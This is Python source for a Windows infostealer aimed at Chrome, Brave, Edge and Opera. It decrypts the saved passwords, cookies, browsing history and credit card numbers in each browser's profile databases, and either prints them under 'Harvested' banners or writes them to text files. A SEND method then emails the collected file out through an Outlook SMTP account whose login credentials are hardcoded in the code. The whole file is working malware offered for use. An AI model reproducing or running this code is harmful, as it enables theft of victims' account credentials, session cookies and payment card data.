import os,shutil,getpass,sqlite3,json,base64,win32crypt,argparse,colorama,smtplib
from email.message import EmailMessage
from Cryptodome.Cipher import AES
from datetime import datetime, timedelta
from requests import get

user = getpass.getuser()

#chrome
ch_localstate = rf'C:\Users\{user}\AppData\Local\Google\Chrome\User Data\Local State'
ch_logindata = rf'C:\Users\{user}\AppData\Local\Google\Chrome\User Data\Default\Login Data'
ch_cookie = rf'C:\Users\{user}\AppData\Local\Google\Chrome\User Data\Default\Network\Cookies'
ch_history = rf'C:\Users\{user}\AppData\Local\Google\Chrome\User Data\Default\History'
ch_creditcard = rf'C:\Users\{user}\AppData\Local\Google\Chrome\User Data\Default\Web Data'
#----------------------------------------
#Brave
br_localstate = rf'C:\Users\{user}\AppData\Local\BraveSoftware\Brave-Browser\User Data\Local State'
br_logindata = rf'C:\Users\{user}\AppData\Local\BraveSoftware\Brave-Browser\User Data\Default\Login Data'
br_cookie = rf'C:\Users\{user}\AppData\Local\BraveSoftware\Brave-Browser\User Data\Default\Network\Cookies'
br_history = rf'C:\Users\{user}\AppData\Local\BraveSoftware\Brave-Browser\User Data\Default\History'
br_creditcard = rf'C:\Users\{user}\AppData\Local\BraveSoftware\Brave-Browser\User Data\Default\Web Data'
#-----------------------------------------
#Microsoft edge
ms_localstate = rf'C:\Users\{user}\AppData\Local\Microsoft\Edge\User Data\Local State'
ms_logindata = rf'C:\Users\{user}\AppData\Local\Microsoft\Edge\User Data\Default\Login Data'
ms_cookie = rf'C:\Users\{user}\AppData\Local\Microsoft\Edge\User Data\Default\Network\Cookies'
ms_history = rf'C:\Users\{user}\AppData\Local\Microsoft\Edge\User Data\Default\History'
ms_creditcard = rf'C:\Users\{user}\AppData\Local\Microsoft\Edge\User Data\Default\Web Data'
#------------------------------------------
#Opera
op_localstate = rf'C:\Users\{user}\AppData\Roaming\Opera Software\Opera Stable\Local State'
op_logindata = r'C:\Users\SHB\AppData\Roaming\Opera Software\Opera Stable\Login Data'
op_cookie = rf'C:\Users\{user}\AppData\Roaming\Opera Software\Opera Stable\Network\Cookies'
op_history = rf'C:\Users\{user}\AppData\Roaming\Opera Software\Opera Stable\History'
op_creditcard = rf'C:\Users\{user}\AppData\Roaming\Opera Software\Opera Stable\Web Data'
def Banner(name):
    print(f"""{colorama.Fore.RED}
  _____                        _             
 |  __ \                      (_)            
 | |  | |_   _ _ __ ___  _ __  _ _ __   __ _ 
 | |  | | | | | '_ ` _ \| '_ \| | '_ \ / _` |
 | |__| | |_| | | | | | | |_) | | | | | (_| |
 |_____/ \__,_|_| |_| |_| .__/|_|_| |_|\__, |
                        | |             __/ |
                        |_|            |___/   {name}
""")

def Banner1(name):
    print(f"""{colorama.Fore.RED} 
   _____                _ _             
  / ____|              | (_)            
 | (___   ___ _ __   __| |_ _ __   __ _ 
  \___ \ / _ \ '_ \ / _` | | '_ \ / _` |
  ____) |  __/ | | | (_| | | | | | (_| |
 |_____/ \___|_| |_|\__,_|_|_| |_|\__, |
                                   __/ |
                                  |___/   {name}
   
""")
class BROWSER():

    pas = []

    def __init__(self,localstatepath,logindatapath,cookiepath = None,historypath = None,creditcardpath = None):
        self.localstatepath = localstatepath
        self.logindatapath = logindatapath
        self.cookiepath = cookiepath
        self.historypath = historypath
        self.creditcardpath = creditcardpath

    def GET_KEY(self):
        with open(self.localstatepath,'r',encoding='utf-8',errors='ignore') as f:
            s = f.read()
            s = json.loads(s)
            ASE = base64.b64decode(s['os_crypt']['encrypted_key'])[5:]
            return win32crypt.CryptUnprotectData(ASE, None, None, None, 0)[1]

    def DECRYPT_KEY(enc_pass,key):
        try:
            init = enc_pass[3:15]
            enc_pass = enc_pass[15:]
            cipher = AES.new(key, AES.MODE_GCM, init)
            return cipher.decrypt(enc_pass)[:-16].decode()
        except:
            try:
                return str(win32crypt.CryptUnprotectData(password, None, None, None, 0)[1])
            except:
                return 'No PASSWORD'
    def GET_TIME(time):
       return datetime(1601, 1, 1) + timedelta(microseconds=time)

    def PASS(self):
        shutil.copyfile(self.logindatapath,'s.db')
        db = sqlite3.connect('s.db')
        cursor = db.cursor()
        cursor.execute('SELECT origin_url, username_value, password_value, date_created, date_last_used from logins order by date_created')
        encp_key = BROWSER.GET_KEY(self)
        pas = []
        for i in cursor.fetchall():
            print(f"{colorama.Fore.GREEN}\nSITE: {colorama.Fore.BLUE}{i[0]}{colorama.Fore.GREEN}\nUSER: {colorama.Fore.BLUE}{i[1]}{colorama.Fore.GREEN}\nPASS: {colorama.Fore.BLUE}{BROWSER.DECRYPT_KEY(i[2],encp_key)}{colorama.Fore.GREEN}\nTime Created: {colorama.Fore.BLUE}{BROWSER.GET_TIME(i[3])}{colorama.Fore.GREEN}\nLast Time Used: {colorama.Fore.BLUE}{BROWSER.GET_TIME(i[3])}")
            print(f'{colorama.Fore.RED}\n****************************************')
            pas.append(1)
        if len(pas) == 1:
            print(f'\t\t\t\t{colorama.Fore.LIGHTWHITE_EX}[+] {len(pas)} Password Harvested')
        else:
            print(f'\t\t\t\t{colorama.Fore.LIGHTWHITE_EX}[+] {len(pas)} Passwords Harvested')
        cursor.close()
        db.close()
        os.remove('s.db')

    def COOKIE(self):
        shutil.copyfile(self.cookiepath,'c.db')
        db = sqlite3.connect('c.db')
        cursor = db.cursor()
        cursor.execute("SELECT host_key,name,value,encrypted_value FROM cookies")
        encp_key =  BROWSER.GET_KEY(self)
        cok = []
        for a,b,c,d in cursor.fetchall():
            if not c:
                decrypted_value = BROWSER.DECRYPT_KEY(d,encp_key)
            else:
                decrypted_value = c
            print(f"{colorama.Fore.GREEN}\nSITE: {colorama.Fore.BLUE}{a}{colorama.Fore.GREEN}\nCookie Name: {colorama.Fore.BLUE}{b}{colorama.Fore.GREEN}\nCookie Value: {colorama.Fore.BLUE}{decrypted_value}")
            print(f'{colorama.Fore.RED}\n****************************************')
            cok.append(1)
        if len(cok) == 1:
            print(f'\t\t\t\t{colorama.Fore.LIGHTWHITE_EX}[+] {len(cok)} Cookie Harvested')
        else:
            print(f'\t\t\t\t{colorama.Fore.LIGHTWHITE_EX}[+] {len(cok)} Cookies Harvested')

        cursor.close()
        db.close()
        os.remove('c.db')

    def HISTORY(self):
        shutil.copyfile(self.historypath,'h.db')
        db = sqlite3.connect('h.db')
        cursor = db.cursor()
        cursor.execute("SELECT url,title,visit_count,last_visit_time FROM urls")
        ln = []
        for a,b,c,d in cursor.fetchall():
            print(f"{colorama.Fore.GREEN}\nUrl: {colorama.Fore.BLUE}{a}{colorama.Fore.GREEN}\nTitle: {colorama.Fore.BLUE}{b}{colorama.Fore.GREEN}\nVisit_Count: {colorama.Fore.BLUE}{c}{colorama.Fore.GREEN}\nLast Tiem Visited: {colorama.Fore.BLUE}{BROWSER.GET_TIME(d)}")
            print(f'{colorama.Fore.RED}\n****************************************')
            ln.append(1)
        if len(ln) == 1:
            print(f'\t\t\t\t{colorama.Fore.LIGHTWHITE_EX}[+] {len(ln)} Link Harvested')
        else:
            print(f'\t\t\t\t{colorama.Fore.LIGHTWHITE_EX}[+] {len(ln)} Links Harvested')
        cursor.close()
        db.close()
        os.remove('h.db')

    def CREDIT_CARD(self):
        shutil.copyfile(self.creditcardpath,'x.db')
        db = sqlite3.connect('x.db')
        cursor = db.cursor()
        cursor.execute('SELECT name_on_card,expiration_month,expiration_year,card_number_encrypted,nickname FROM credit_cards')
        encp_key = BROWSER.GET_KEY(self)
        cc = []
        for i in cursor.fetchall():
            print(f"{colorama.Fore.GREEN}\nHolder Name: {colorama.Fore.BLUE}{i[0]} {colorama.Fore.GREEN}\nNickname: {colorama.Fore.BLUE}{i[4]} {colorama.Fore.GREEN}\nCard number: {colorama.Fore.BLUE}{BROWSER.DECRYPT_KEY(i[3],encp_key)} {colorama.Fore.GREEN}\nExpiration Date: {colorama.Fore.BLUE}{i[1]}/{i[2]}")
            print('\n****************************************')
            cc.append(1)
        if len(cc) == 1:
            print(f'\t\t\t\t{colorama.Fore.LIGHTWHITE_EX}[+] {len(cc)} Card Harvested')
        else:
            print(f'\t\t\t\t{colorama.Fore.LIGHTWHITE_EX}[+] {len(cc)} Cards Harvested')
        cursor.close()
        db.close()
        os.remove('x.db')

class BROWSER_SENDER():
    
    def __init__(self,localstatepath,logindatapath,cookiepath = None,historypath = None,creditcardpath = None,name = None,subject = None,path = None,email = None):
        self.localstatepath = localstatepath
        self.logindatapath = logindatapath
        self.cookiepath = cookiepath
        self.historypath = historypath
        self.creditcardpath = creditcardpath
        self.name = name
        self.subject = subject
        self.path = path
        self.email = email

    def GET_KEY(self):
        with open(self.localstatepath,'r',encoding='utf-8',errors='ignore') as f:
            s = f.read()
            s = json.loads(s)
            ASE = base64.b64decode(s['os_crypt']['encrypted_key'])[5:]
            return win32crypt.CryptUnprotectData(ASE, None, None, None, 0)[1]

    def DECRYPT_KEY(enc_pass,key):
        try:
            init = enc_pass[3:15]
            enc_pass = enc_pass[15:]
            cipher = AES.new(key, AES.MODE_GCM, init)
            return cipher.decrypt(enc_pass)[:-16].decode()
        except:
            try:
                return str(win32crypt.CryptUnprotectData(password, None, None, None, 0)[1])
            except:
                return 'No PASSWORD'
    def GET_TIME(time):
       return datetime(1601, 1, 1) + timedelta(microseconds=time)

    def PASS(self):
        shutil.copyfile(self.logindatapath,'s.db')
        db = sqlite3.connect('s.db')
        cursor = db.cursor()
        cursor.execute('SELECT origin_url, username_value, password_value, date_created, date_last_used from logins order by date_created')
        encp_key = BROWSER.GET_KEY(self)
        file = rf'C:\Users\{user}\Documents\{self.name}_pass.txt'
        for i in cursor.fetchall():
            with open(file,'a+',encoding='utf-8') as f:
                f.write(f"\nSITE: {i[0]}\nUSER: {i[1]}\nPASS: {BROWSER.DECRYPT_KEY(i[2],encp_key)}\nTime Created: {BROWSER.GET_TIME(i[3])}\nLast Time Used: {BROWSER.GET_TIME(i[3])}")
                f.write('\n****************************************')
        cursor.close()
        db.close()
        os.remove('s.db')

    def COOKIE(self):
        shutil.copyfile(self.cookiepath,'c.db')
        db = sqlite3.connect('c.db')
        cursor = db.cursor()
        cursor.execute("SELECT host_key,name,value,encrypted_value FROM cookies")
        encp_key =  BROWSER.GET_KEY(self)
        for a,b,c,d in cursor.fetchall():
            if not c:
                decrypted_value = BROWSER.DECRYPT_KEY(d,encp_key)
            else:
                decrypted_value = c
            file = rf'C:\Users\{user}\Documents\{self.name}_cookies.txt'
            with open(file,'a+',encoding='utf-8') as f:
                f.write(f"\nSITE: {a}\nCookie Name: {b}\nCookie Value: {decrypted_value}")
                f.write('\n****************************************')

        cursor.close()
        db.close()
        os.remove('c.db')

    def HISTORY(self):
        shutil.copyfile(self.historypath,'h.db')
        db = sqlite3.connect('h.db')
        cursor = db.cursor()
        cursor.execute("SELECT url,title,visit_count,last_visit_time FROM urls")
        for a,b,c,d in cursor.fetchall():
            file = rf'C:\Users\{user}\Documents\{self.name}_history.txt'
            with open(file,'a+',encoding='utf-8') as f:
                f.write(f"\nUrl: {a}\nTitle: {b}\nVisit_Count: {c}\nLast Tiem Visited: {BROWSER.GET_TIME(d)}")
                f.write('\n****************************************')
        cursor.close()
        db.close()
        os.remove('h.db')

    def CREDIT_CARD(self):
        shutil.copyfile(self.creditcardpath,'x.db')
        db = sqlite3.connect('x.db')
        cursor = db.cursor()
        cursor.execute('SELECT name_on_card,expiration_month,expiration_year,card_number_encrypted,nickname FROM credit_cards')
        encp_key = BROWSER.GET_KEY(self)
        file = rf'C:\Users\{user}\Documents\{self.name}_creditcard.txt'
        for i in cursor.fetchall():
            with open(file,'a+',encoding='utf-8') as f:
                f.write(f"\nHolder Name: {i[0]} \nNickname: {i[4]} \nCard number: {BROWSER.DECRYPT_KEY(i[3],encp_key)} \nExpiration Date: {i[1]}/{i[2]}")
                f.write('\n****************************************')
        cursor.close()
        db.close()
        os.remove('x.db')

    def SEND(self):
        s = smtplib.SMTP('smtp.office365.com', 587)
        s.starttls()
        s.login('shababbazzal66@outlook.com', 'Shababbz12')
        msg = EmailMessage()
        msg["From"] = 'shababbazzal66@outlook.com'
        msg["Subject"] = self.subject
        msg["To"] = self.email
        msg.set_content(" ")
        msg.add_attachment(open(self.path, "r",errors='ignore').read())
        s.send_message(msg)
        os.remove(self.path)